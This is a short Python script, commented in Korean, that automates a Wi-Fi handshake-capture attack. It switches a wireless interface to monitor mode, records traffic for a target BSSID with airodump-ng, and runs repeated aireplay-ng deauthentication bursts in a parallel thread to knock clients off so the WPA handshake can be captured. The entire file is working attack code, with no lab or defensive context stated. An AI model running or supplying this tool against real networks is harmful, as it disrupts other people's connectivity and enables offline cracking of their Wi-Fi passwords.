import subprocess
import threading
import time
import os

def run_deauth_loop(bssid, interface, duration=50, interval=7):
    end_time = time.time() + duration
    while time.time() < end_time:
        subprocess.run([
            'sudo', 'aireplay-ng',
            '--deauth', '10',
            '-a', bssid,
            interface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(interval)

def capture_handshake(bssid, channel, interface, output_file, duration=50):
    # 기존 handshake.cap 파일 삭제 (파일이 존재하면)
    if os.path.exists(f"{output_file}-01.cap"):
        os.remove(f"{output_file}-01.cap")
    
    # 모니터 모드 시작
    subprocess.run(['sudo', 'airmon-ng', 'start', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    mon_interface = interface + "mon"

    # 핸드셰이크 캡처 시작
    capture_proc = subprocess.Popen([
        'sudo', 'airodump-ng',
        '-c', str(channel),
        '--bssid', bssid,
        '-w', output_file,  # 고정된 파일명으로 덮어쓰기
        mon_interface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # deauth 공격 병렬 실행
    deauth_thread = threading.Thread(target=run_deauth_loop, args=(bssid, mon_interface))
    deauth_thread.start()

    # 지정 시간만큼 대기 후 캡처 종료
    time.sleep(duration)
    capture_proc.terminate()

    # 모니터 모드 종료
    subprocess.run(['sudo', 'airmon-ng', 'stop', mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
